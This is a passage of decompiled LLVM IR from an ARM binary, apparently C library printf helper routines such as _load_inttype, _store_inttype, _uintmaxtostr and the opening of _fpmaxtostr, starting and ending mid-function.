  %v1_18044 = and i32 %v3_17fe8, 2
  %v2_18044 = icmp eq i32 %v1_18044, 0
  store i1 %v2_18044, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18044, label %dec_label_pc_18064, label %dec_label_pc_1804c

dec_label_pc_1804c:                               ; preds = %dec_label_pc_18034, %dec_label_pc_18044
  %v1_1804c = and i32 %v4_17ff0, 1024
  %v2_1804c = icmp eq i32 %v1_1804c, 0
  store i1 %v2_1804c, i1* %cpsr_z.global-to-local, align 1
  %tmp13 = udiv i32 %v1_1804c, 1024
  %tmp14 = add nuw nsw i32 %tmp13, 1
  store i32 %tmp14, i32* @r2, align 4
  %v0_18058 = call i32 @__GI_fseek()
  store i32 %v0_18058, i32* %r0.global-to-local, align 4
  %v2_1805c = icmp eq i32 %v0_18058, 0
  store i1 %v2_1805c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1805c, label %.dec_label_pc_18064_crit_edge, label %dec_label_pc_18008

.dec_label_pc_18064_crit_edge:                    ; preds = %dec_label_pc_1804c
  %v0_18064.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_18064

dec_label_pc_18064:                               ; preds = %.dec_label_pc_18064_crit_edge, %dec_label_pc_1802c, %dec_label_pc_18044
  %v2_18074 = phi i32 [ %v0_18064.pre, %.dec_label_pc_18064_crit_edge ], [ %v0_18034, %dec_label_pc_1802c ], [ %v0_18034, %dec_label_pc_18044 ]
  %v1_18064 = inttoptr i32 %v2_18074 to i32*
  %v2_18064 = load i32, i32* %v1_18064, align 4
  store i32 %v2_18064, i32* %r3.global-to-local, align 4
  %v1_18068 = add i32 %v2_18074, 8
  %v2_18068 = inttoptr i32 %v1_18068 to i32*
  %v3_18068 = load i32, i32* %v2_18068, align 4
  store i32 %v3_18068, i32* %r1.global-to-local, align 4
  %v1_1806c = and i32 %v2_18064, -4
  store i32 %v1_1806c, i32* %r3.global-to-local, align 4
  %v3_18070 = sdiv i32 %v2_18064, 256
  store i32 %v3_18070, i32* %r2.global-to-local, align 4
  %v1_18074 = trunc i32 %v3_18070 to i8
  %v3_18074 = add i32 %v2_18074, 1
  %v4_18074 = inttoptr i32 %v3_18074 to i8*
  store i8 %v1_18074, i8* %v4_18074, align 1
  %v0_18078 = load i32, i32* %r1.global-to-local, align 4
  %v1_18078 = load i32, i32* @r4, align 4
  %v2_18078 = add i32 %v1_18078, 20
  %v3_18078 = inttoptr i32 %v2_18078 to i32*
  store i32 %v0_18078, i32* %v3_18078, align 4
  %v0_1807c = load i32, i32* %r3.global-to-local, align 4
  %v1_1807c = trunc i32 %v0_1807c to i8
  %v2_1807c = load i32, i32* @r4, align 4
  %v3_1807c = inttoptr i32 %v2_1807c to i8*
  store i8 %v1_1807c, i8* %v3_1807c, align 1
  %v0_18080 = load i32, i32* %r1.global-to-local, align 4
  %v1_18080 = load i32, i32* @r4, align 4
  %v2_18080 = add i32 %v1_18080, 24
  %v3_18080 = inttoptr i32 %v2_18080 to i32*
  store i32 %v0_18080, i32* %v3_18080, align 4
  %v0_18084 = load i32, i32* %r1.global-to-local, align 4
  %v1_18084 = load i32, i32* @r4, align 4
  %v2_18084 = add i32 %v1_18084, 16
  %v3_18084 = inttoptr i32 %v2_18084 to i32*
  store i32 %v0_18084, i32* %v3_18084, align 4
  %v0_18088.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_18088

dec_label_pc_18088:                               ; preds = %dec_label_pc_18024, %dec_label_pc_18064
  %v2_18094 = phi i32 [ %v0_18034, %dec_label_pc_18024 ], [ %v0_18088.pre, %dec_label_pc_18064 ]
  %v1_18088 = inttoptr i32 %v2_18094 to i32*
  %v2_18088 = load i32, i32* %v1_18088, align 4
  %v1_1808c = or i32 %v2_18088, 64
  store i32 %v1_1808c, i32* %r2.global-to-local, align 4
  %v3_18090 = sdiv i32 %v2_18088, 256
  store i32 %v3_18090, i32* %r3.global-to-local, align 4
  %v1_18094 = trunc i32 %v3_18090 to i8
  %v3_18094 = add i32 %v2_18094, 1
  %v4_18094 = inttoptr i32 %v3_18094 to i8*
  store i8 %v1_18094, i8* %v4_18094, align 1
  %v0_18098 = load i32, i32* @r4, align 4
  %v1_18098 = add i32 %v0_18098, 1
  %v2_18098 = inttoptr i32 %v1_18098 to i8*
  %v3_18098 = load i8, i8* %v2_18098, align 1
  %v4_18098 = zext i8 %v3_18098 to i32
  %v3_1809c = mul nuw nsw i32 %v4_18098, 256
  store i32 %v3_1809c, i32* %r3.global-to-local, align 4
  %v1_180a0 = and i32 %v3_1809c, 2816
  store i32 %v1_180a0, i32* %r0.global-to-local, align 4
  %v2_180a0 = icmp eq i32 %v1_180a0, 0
  store i1 %v2_180a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_180a0, label %bb9, label %.thread1

bb9:                                              ; preds = %dec_label_pc_18088
  %v2_180a4 = add i32 %v0_18098, 12
  %v3_180a4 = inttoptr i32 %v2_180a4 to i32*
  %v4_180a4 = load i32, i32* %v3_180a4, align 4
  store i32 %v4_180a4, i32* %r3.global-to-local, align 4
  br label %bb10

.thread1:                                         ; preds = %dec_label_pc_18088
  store i32 0, i32* %r0.global-to-local, align 4
  br label %bb10

bb10:                                             ; preds = %bb9, %.thread1
  %v0_180ac = load i32, i32* %r2.global-to-local, align 4
  %v1_180ac = trunc i32 %v0_180ac to i8
  %v3_180ac = inttoptr i32 %v0_18098 to i8*
  store i8 %v1_180ac, i8* %v3_180ac, align 1
  %v0_180b0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_180b0, label %bb11, label %bb12

bb11:                                             ; preds = %bb10
  %v1_180b0 = load i32, i32* %r3.global-to-local, align 4
  %v2_180b0 = load i32, i32* @r4, align 4
  %v3_180b0 = add i32 %v2_180b0, 28
  %v4_180b0 = inttoptr i32 %v3_180b0 to i32*
  store i32 %v1_180b0, i32* %v4_180b0, align 4
  br label %bb12

bb12:                                             ; preds = %bb10, %bb11
  %v2_180b4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_180b4, i32* @r4, align 4
  %v8_180b4 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v8_180b4

; uselistorder directives
  uselistorder i32 %v3_1809c, { 1, 0 }
  uselistorder i32 %v3_18090, { 1, 0 }
  uselistorder i32 %v3_18070, { 1, 0 }
  uselistorder i32 %v2_18074, { 0, 2, 1 }
  uselistorder i1 %v2_18024, { 1, 0 }
  uselistorder i32 %v3_18010, { 1, 0 }
  uselistorder i32 %v0_18034, { 0, 1, 2, 4, 3, 6, 5 }
  uselistorder i32 %v3_17fdc, { 1, 0 }
  uselistorder i32 %v5_17fc0, { 0, 2, 1, 3 }
  uselistorder i32* %r3.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 0, 2, 4, 3, 5 }
  uselistorder label %bb12, { 1, 0 }
  uselistorder label %bb10, { 1, 0 }
  uselistorder label %dec_label_pc_18088, { 1, 0 }
  uselistorder label %dec_label_pc_18064, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1804c, { 1, 0 }
  uselistorder label %dec_label_pc_17ffc, { 1, 0 }
  uselistorder label %dec_label_pc_17fe8, { 1, 0 }
}

define i32 @_load_inttype() local_unnamed_addr {
entry:
  %v0_180b8 = load i32, i32* @r2, align 4
  %v1_180b8 = icmp slt i32 %v0_180b8, 0
  %v0_180bc = load i32, i32* @r0, align 4
  %v1_180c0 = and i32 %v0_180bc, 2048
  %v2_180f4 = icmp eq i32 %v1_180c0, 0
  br i1 %v1_180b8, label %dec_label_pc_180f4, label %dec_label_pc_180c8

dec_label_pc_180c8:                               ; preds = %entry
  br i1 %v2_180f4, label %dec_label_pc_180d0, label %dec_label_pc_180fc

dec_label_pc_180d0:                               ; preds = %dec_label_pc_180c8
  %v7_180d0 = icmp eq i32 %v0_180bc, 256
  %v0_180d4 = load i32, i32* @r1, align 4
  %v1_180d4 = inttoptr i32 %v0_180d4 to i32*
  %v2_180d4 = load i32, i32* %v1_180d4, align 4
  %v2_180d8 = urem i32 %v2_180d4, 256
  %v2_180d8.v2_180d4 = select i1 %v7_180d0, i32 %v2_180d8, i32 %v2_180d4
  br i1 %v7_180d0, label %.thread, label %dec_label_pc_180e0

dec_label_pc_180e0:                               ; preds = %dec_label_pc_180d0
  %v7_180e0 = icmp eq i32 %v0_180bc, 512
  br i1 %v7_180e0, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_180e0
  %v4_180e8 = urem i32 %v2_180d8.v2_180d4, 65536
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_180e0, %dec_label_pc_180d0, %bb
  %v1_180f0 = phi i32 [ %v2_180d4, %dec_label_pc_180e0 ], [ %v2_180d8, %dec_label_pc_180d0 ], [ %v4_180e8, %bb ]
  store i32 0, i32* @r1, align 4
  ret i32 %v1_180f0

dec_label_pc_180f4:                               ; preds = %entry
  br i1 %v2_180f4, label %dec_label_pc_18104, label %dec_label_pc_180fc

dec_label_pc_180fc:                               ; preds = %dec_label_pc_180c8, %dec_label_pc_180f4
  %v0_180fc = load i32, i32* @r1, align 4
  %v1_180fc = inttoptr i32 %v0_180fc to i32*
  %v2_180fc = load i32, i32* %v1_180fc, align 4
  %v3_180fc = add i32 %v0_180fc, 4
  %v4_180fc = inttoptr i32 %v3_180fc to i32*
  %v5_180fc = load i32, i32* %v4_180fc, align 4
  store i32 %v5_180fc, i32* @r1, align 4
  ret i32 %v2_180fc

dec_label_pc_18104:                               ; preds = %dec_label_pc_180f4
  %v7_18104 = icmp eq i32 %v0_180bc, 256
  %v0_18108 = load i32, i32* @r1, align 4
  %v1_18108 = inttoptr i32 %v0_18108 to i32*
  %v2_18108 = load i32, i32* %v1_18108, align 4
  %v2_1810c = urem i32 %v2_18108, 256
  %v2_1810c.v2_18108 = select i1 %v7_18104, i32 %v2_1810c, i32 %v2_18108
  br i1 %v7_18104, label %.thread2, label %dec_label_pc_18114

dec_label_pc_18114:                               ; preds = %dec_label_pc_18104
  %v7_18114 = icmp eq i32 %v0_180bc, 512
  br i1 %v7_18114, label %bb5, label %.thread2

bb5:                                              ; preds = %dec_label_pc_18114
  %v4_18118 = mul i32 %v2_1810c.v2_18108, 65536
  %v4_1811c = sdiv i32 %v4_18118, 65536
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_18114, %dec_label_pc_18104, %bb5
  %v0_18120 = phi i32 [ %v2_18108, %dec_label_pc_18114 ], [ %v2_1810c, %dec_label_pc_18104 ], [ %v4_1811c, %bb5 ]
  %v3_18120 = ashr i32 %v0_18120, 31
  store i32 %v3_18120, i32* @r1, align 4
  ret i32 %v0_18120

; uselistorder directives
  uselistorder i32 %v0_18120, { 1, 0 }
  uselistorder i32 %v2_1810c, { 1, 0 }
  uselistorder i32 %v2_18108, { 1, 2, 0 }
  uselistorder i32 %v2_180d8, { 1, 0 }
  uselistorder i32 %v2_180d4, { 1, 2, 0 }
  uselistorder i1 %v2_180f4, { 1, 0 }
  uselistorder label %.thread2, { 2, 0, 1 }
  uselistorder label %dec_label_pc_180fc, { 1, 0 }
  uselistorder label %.thread, { 2, 0, 1 }
}

define i32 @_store_inttype(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = trunc i32 %arg3 to i8
  %tmp2 = ptrtoint i8* %arg1 to i32
  %v7_18128 = icmp eq i32 %arg2, 256
  br i1 %v7_18128, label %dec_label_pc_18154, label %dec_label_pc_18130

dec_label_pc_18130:                               ; preds = %entry
  %v7_18130 = icmp eq i32 %arg2, 2048
  br i1 %v7_18130, label %dec_label_pc_18138, label %dec_label_pc_18140

dec_label_pc_18138:                               ; preds = %dec_label_pc_18130
  %tmp3 = bitcast i8* %arg1 to i32*
  store i32 %arg3, i32* %tmp3, align 4
  %v5_18138 = add i32 %tmp2, 4
  %v6_18138 = inttoptr i32 %v5_18138 to i32*
  store i32 %arg4, i32* %v6_18138, align 4
  ret i32 %tmp2

dec_label_pc_18140:                               ; preds = %dec_label_pc_18130
  %v7_18140 = icmp eq i32 %arg2, 512
  br i1 %v7_18140, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_18140
  %tmp4 = bitcast i8* %arg1 to i32*
  store i32 %arg3, i32* %tmp4, align 4
  ret i32 %tmp2

.thread:                                          ; preds = %dec_label_pc_18140
  %v4_18144 = sdiv i32 %arg3, 256
  %v1_18150 = trunc i32 %v4_18144 to i8
  %v4_18150 = add i32 %tmp2, 1
  %v5_18150 = inttoptr i32 %v4_18150 to i8*
  store i8 %v1_18150, i8* %v5_18150, align 1
  br label %dec_label_pc_18154

dec_label_pc_18154:                               ; preds = %entry, %.thread
  store i8 %tmp, i8* %arg1, align 1
  ret i32 %tmp2

; uselistorder directives
  uselistorder i32 %tmp2, { 4, 1, 0, 2, 3 }
  uselistorder i8* %arg1, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_18154, { 1, 0 }
}

define i32 @_uintmaxtostr(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %stack_var_-40 = alloca i8, align 1
  store i32 %arg4, i32* %r7.global-to-local, align 4
  %v1_18160 = icmp slt i32 %arg4, 0
  %v2_18160 = icmp eq i32 %arg4, 0
  store i1 %v2_18160, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* %r8.global-to-local, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  store i32 %arg3, i32* %r6.global-to-local, align 4
  br i1 %v1_18160, label %dec_label_pc_18178, label %dec_label_pc_18198

dec_label_pc_18178:                               ; preds = %entry
  %v1_18178 = icmp slt i32 %arg3, 0
  %v2_18178 = icmp eq i32 %arg3, 0
  store i1 %v2_18178, i1* %cpsr_z.global-to-local, align 1
  %v1_1817c = sub i32 0, %arg4
  store i32 %v1_1817c, i32* %r7.global-to-local, align 4
  br i1 %v1_18178, label %dec_label_pc_18184, label %dec_label_pc_18198

dec_label_pc_18184:                               ; preds = %dec_label_pc_18178
  %v1_18188 = sub i32 0, %arg2
  store i32 %v1_18188, i32* %r5.global-to-local, align 4
  %v2_18188 = icmp eq i32 %arg2, 0
  %v2_1818c = icmp eq i1 %v2_18188, false
  %v5_1818c = sext i1 %v2_1818c to i32
  %v6_1818c = sub i32 %v5_1818c, %arg3
  store i32 %v6_1818c, i32* %r6.global-to-local, align 4
  %v19_1818c = icmp eq i32 %v6_1818c, 0
  store i1 %v19_1818c, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_181a0

dec_label_pc_18198:                               ; preds = %dec_label_pc_18178, %entry
  br label %dec_label_pc_181a0

dec_label_pc_181a0:                               ; preds = %dec_label_pc_18184, %dec_label_pc_18198
  %storemerge = phi i8 [ 0, %dec_label_pc_18198 ], [ 1, %dec_label_pc_18184 ]
  store i8 %storemerge, i8* %stack_var_-40, align 1
  store i32 0, i32* %sl.global-to-local, align 4
  store i8 0, i8* %arg1, align 1
  %v0_181a8 = load i32, i32* %r7.global-to-local, align 4
  %v2_181b0 = udiv i32 -1, %v0_181a8
  store i32 %v2_181b0, i32* %fp.global-to-local, align 4
  %v2_181c0 = urem i32 -1, %v0_181a8
  %v1_181c4 = add i32 %v2_181c0, 1
  store i32 %v1_181c4, i32* %sb.global-to-local, align 4
  %v9_181c8 = icmp eq i32 %v1_181c4, %v0_181a8
  store i1 %v9_181c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_181c8, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_181a0
  %v1_181cc = load i32, i32* %sl.global-to-local, align 4
  store i32 %v1_181cc, i32* %sb.global-to-local, align 4
  %v2_181d0 = add i32 %v2_181b0, 1
  store i32 %v2_181d0, i32* %fp.global-to-local, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_181a0, %bb
  %v0_181d4 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_181d4, i32* %sl.global-to-local, align 4
  %v0_181d8 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_181d8, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_181dc

dec_label_pc_181dcthread-pre-split:               ; preds = %bb21
  %v0_181dc.pr = load i32, i32* %sl.global-to-local, align 4
  %v0_181e4.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_181dc

dec_label_pc_181dc:                               ; preds = %dec_label_pc_181dcthread-pre-split, %.thread
  %v0_1824c = phi i32 [ %v0_181e4.pre, %dec_label_pc_181dcthread-pre-split ], [ %v0_181a8, %.thread ]
  %v0_181f8 = phi i32 [ %v0_181dc.pr, %dec_label_pc_181dcthread-pre-split ], [ %v0_181d4, %.thread ]
  %v2_181dc = icmp eq i32 %v0_181f8, 0
  store i1 %v2_181dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_181dc, label %dec_label_pc_18248, label %dec_label_pc_181ec

dec_label_pc_181ec:                               ; preds = %dec_label_pc_181dc
  %v2_181ec = urem i32 %v0_181f8, %v0_1824c
  %v2_181fc = udiv i32 %v0_181f8, %v0_1824c
  store i32 %v2_181fc, i32* %sl.global-to-local, align 4
  %v0_18208 = load i32, i32* %r6.global-to-local, align 4
  %v2_1820c = urem i32 %v0_18208, %v0_1824c
  %v1_18214 = load i32, i32* %sb.global-to-local, align 4
  %v3_18214 = mul i32 %v1_18214, %v2_181ec
  %v4_18214 = add i32 %v3_18214, %v2_1820c
  store i32 %v4_18214, i32* %r5.global-to-local, align 4
  %v2_1821c = udiv i32 %v0_18208, %v0_1824c
  %v0_18224 = load i32, i32* %fp.global-to-local, align 4
  %v3_18224 = mul i32 %v0_18224, %v2_181ec
  %v4_18224 = add i32 %v3_18224, %v2_1821c
  %v2_1822c = udiv i32 %v4_18214, %v0_1824c
  %v2_18234 = add i32 %v4_18224, %v2_1822c
  br label %dec_label_pc_18268

dec_label_pc_18248:                               ; preds = %dec_label_pc_181dc
  %v0_18248 = load i32, i32* %r6.global-to-local, align 4
  %v2_18260 = udiv i32 %v0_18248, %v0_1824c
  br label %dec_label_pc_18268

dec_label_pc_18268:                               ; preds = %dec_label_pc_181ec, %dec_label_pc_18248
  %storemerge24 = phi i32 [ %v2_18260, %dec_label_pc_18248 ], [ %v2_18234, %dec_label_pc_181ec ]
  %v0_18284 = phi i32 [ %v2_18260, %dec_label_pc_18248 ], [ %v2_18234, %dec_label_pc_181ec ]
  %v1_18284 = phi i32 [ 0, %dec_label_pc_18248 ], [ %v2_181fc, %dec_label_pc_181ec ]
  %v4_18214.pn = phi i32 [ %v0_18248, %dec_label_pc_18248 ], [ %v4_18214, %dec_label_pc_181ec ]
  store i32 %storemerge24, i32* %r6.global-to-local, align 4
  %v0_18270 = urem i32 %v4_18214.pn, %v0_1824c
  %v3_18268 = load i32, i32* %stack_var_0, align 4
  %v2_1826c = icmp ugt i32 %v0_18270, 8
  %v7_1826c = icmp eq i32 %v0_18270, 9
  store i1 %v7_1826c, i1* %cpsr_z.global-to-local, align 1
  %v1_18274 = add i32 %v0_18270, 48
  %v0_1827c = load i32, i32* %r8.global-to-local, align 4
  %v1_1827c = add i32 %v0_1827c, -1
  store i32 %v1_1827c, i32* %r8.global-to-local, align 4
  %v2_18280 = xor i1 %v7_1826c, true
  %v3_18280 = and i1 %v2_1826c, %v2_18280
  %extract.t = trunc i32 %v1_18274 to i8
  br i1 %v3_18280, label %bb20, label %bb21

bb20:                                             ; preds = %dec_label_pc_18268
  %v2_18270 = add i32 %v3_18268, %v0_18270
  %extract.t8 = trunc i32 %v2_18270 to i8
  br label %bb21

bb21:                                             ; preds = %dec_label_pc_18268, %bb20
  %v0_18288.off0 = phi i8 [ %extract.t, %dec_label_pc_18268 ], [ %extract.t8, %bb20 ]
  %v2_18284 = or i32 %v0_18284, %v1_18284
  %v4_18284 = icmp eq i32 %v2_18284, 0
  store i1 %v4_18284, i1* %cpsr_z.global-to-local, align 1
  %v3_18288 = inttoptr i32 %v1_1827c to i8*
  store i8 %v0_18288.off0, i8* %v3_18288, align 1
  %v0_1828c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1828c, label %dec_label_pc_18290, label %dec_label_pc_181dcthread-pre-split

dec_label_pc_18290:                               ; preds = %bb21
  %v2_18290 = load i8, i8* %stack_var_-40, align 1
  %v2_18294 = icmp eq i8 %v2_18290, 0
  store i1 %v2_18294, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18294, label %dec_label_pc_18290..thread2_crit_edge, label %bb22

dec_label_pc_18290..thread2_crit_edge:            ; preds = %dec_label_pc_18290
  %v0_182a0.pre = load i32, i32* %r8.global-to-local, align 4
  br label %.thread2

bb22:                                             ; preds = %dec_label_pc_18290
  %v3_1829c = load i32, i32* %r8.global-to-local, align 4
  %v4_1829c = add i32 %v3_1829c, -1
  %v5_1829c = inttoptr i32 %v4_1829c to i8*
  store i8 45, i8* %v5_1829c, align 1
  %v6_1829c = load i32, i32* %r8.global-to-local, align 4
  %v7_1829c = add i32 %v6_1829c, -1
  store i32 %v7_1829c, i32* %r8.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_18290..thread2_crit_edge, %bb22
  %v0_182a0 = phi i32 [ %v0_182a0.pre, %dec_label_pc_18290..thread2_crit_edge ], [ %v7_1829c, %bb22 ]
  ret i32 %v0_182a0

; uselistorder directives
  uselistorder i32 %v0_18270, { 3, 2, 1, 0 }
  uselistorder i32 %v0_1824c, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i8* %stack_var_-40, { 1, 0 }
  uselistorder i32* %stack_var_0, { 1, 0 }
  uselistorder i32* %sb.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r8.global-to-local, { 0, 2, 3, 1, 4, 5, 6 }
  uselistorder i32* %r7.global-to-local, { 1, 2, 0, 3 }
  uselistorder i32* %r6.global-to-local, { 0, 2, 1, 3, 5, 4, 6 }
  uselistorder i32* %r5.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %fp.global-to-local, { 1, 0, 2 }
  uselistorder i8 45, { 1, 0, 2, 3, 4 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %bb21, { 1, 0 }
  uselistorder label %dec_label_pc_18268, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_181a0, { 1, 0 }
}

define i32 @_fpmaxtostr(i32 %arg1, double %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = fptrunc double %arg2 to float
  %tmp183 = bitcast float %tmp to i32
  store i32 %tmp183, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %stack_var_-42 = alloca i8, align 1
  %stack_var_-160 = alloca i32, align 4
  %stack_var_-43 = alloca i32, align 4
  %stack_var_-140 = alloca i32, align 4
  %stack_var_-128 = alloca i32, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-38 = alloca i32, align 4
  %stack_var_-78 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-79 = alloca i32, align 4
  %stack_var_-77 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-200 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_182ac = load i32, i32* @r4, align 4
  store i32 %v3_182ac, i32* %stack_var_-36, align 4
  %v1_182b0 = add i32 %arg4, 8
  %v2_182b0 = inttoptr i32 %v1_182b0 to i8*
  %v3_182b0 = load i8, i8* %v2_182b0, align 1
  %v4_182b0 = zext i8 %v3_182b0 to i32
  store i32 %v4_182b0, i32* %sl.global-to-local, align 4
  store i32 %arg4, i32* %stack_var_-200, align 4
  %v1_182bc = or i32 %v4_182b0, 32
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_182c0 = icmp ult i32 %v1_182bc, 97
  store i1 %v6_182c0, i1* %cpsr_n.global-to-local, align 1
  %v7_182c0 = icmp eq i32 %v1_182bc, 97
  store i1 %v7_182c0, i1* %cpsr_z.global-to-local, align 1
  store i32 101, i32* %r3.global-to-local, align 4
  store i32 %tmp183, i32* %r6.global-to-local, align 4
  store i32 %arg4, i32* %r1.global-to-local, align 4
  %v1_182d4 = inttoptr i32 %arg4 to i32*
  %v2_182d4 = load i32, i32* %v1_182d4, align 4
  store i32 %v2_182d4, i32* %r1.global-to-local, align 4
  br i1 %v7_182c0, label %bb, label %.thread

bb:                                               ; preds = %entry
  %v2_182d8 = add nuw nsw i32 %v4_182b0, 6
  store i32 %v2_182d8, i32* %r3.global-to-local, align 4
  %v2_182e0 = urem i32 %v2_182d8, 256
  store i32 %v2_182e0, i32* %sl.global-to-local, align 4
  br label %.thread

.thread:                                          ; preds = %entry, %bb
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %v2_182d4, i32* %ip.global-to-local, align 4
  store i32 %arg4, i32* %r0.global-to-local, align 4
  store i32 %arg3, i32* %r7.global-to-local, align 4
  %v1_182f8 = add i32 %arg4, 12
  %v2_182f8 = inttoptr i32 %v1_182f8 to i32*
  %v3_182f8 = load i32, i32* %v2_182f8, align 4
  store i32 %v3_182f8, i32* %r2.global-to-local, align 4
  %v1_182fc = add i32 %arg4, 4
  %v2_182fc = inttoptr i32 %v1_182fc to i32*
  %v3_182fc = load i32, i32* %v2_182fc, align 4
  store i32 %v3_182fc, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_18300 = icmp slt i32 %v2_182d4, 0
  store i1 %v1_18300, i1* %cpsr_n.global-to-local, align 1
  %v2_18300 = icmp eq i32 %v2_182d4, 0
  store i1 %v2_18300, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_18300, label %bb223, label %bb224

bb223:                                            ; preds = %.thread
  store i32 6, i32* %ip.global-to-local, align 4
  br label %bb224

bb224:                                            ; preds = %.thread, %bb223
  %v1_18660 = phi i32 [ %v2_182d4, %.thread ], [ 6, %bb223 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_1830c = and i32 %v3_182f8, 2
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_1830c = icmp eq i32 %v1_1830c, 0
  store i1 %v2_1830c, i1* %cpsr_z.global-to-local, align 1
  store i8 0, i8* %stack_var_-42, align 1
  br i1 %v2_1830c, label %dec_label_pc_18324, label %dec_label_pc_18330

dec_label_pc_18324:                               ; preds = %bb224
  %v1_18324 = urem i32 %v3_182f8, 2
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_18324 = icmp eq i32 %v1_18324, 0
  store i1 %v2_18324, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18324, label %dec_label_pc_18334, label %dec_label_pc_18330

dec_label_pc_18330:                               ; preds = %dec_label_pc_18324, %bb224
  %storemerge = phi i32 [ 43, %bb224 ], [ 32, %dec_label_pc_18324 ]
  %v0_18330.off0 = phi i8 [ 43, %bb224 ], [ 32, %dec_label_pc_18324 ]
  store i32 %storemerge, i32* %r3.global-to-local, align 4
  store i8 %v0_18330.off0, i8* %stack_var_-42, align 1
  br label %dec_label_pc_18334

dec_label_pc_18334:                               ; preds = %dec_label_pc_18324, %dec_label_pc_18330
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 %arg3, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r1.global-to-local, align 4
  store i32 %tmp183, i32* %r2.global-to-local, align 4
  %v7_18350 = fcmp ord double %arg2, 0.000000e+00
  %not.v7_18350 = xor i1 %v7_18350, true
  %v9_18350 = sext i1 %not.v7_18350 to i32
  store i32 %v9_18350, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 %not.v7_18350, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_18350, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18350, label %dec_label_pc_18364, label %bb226

bb226:                                            ; preds = %dec_label_pc_18334
  store i32 8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_18418

dec_label_pc_18364:                               ; preds = %dec_label_pc_18334
  store i32 %arg3, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
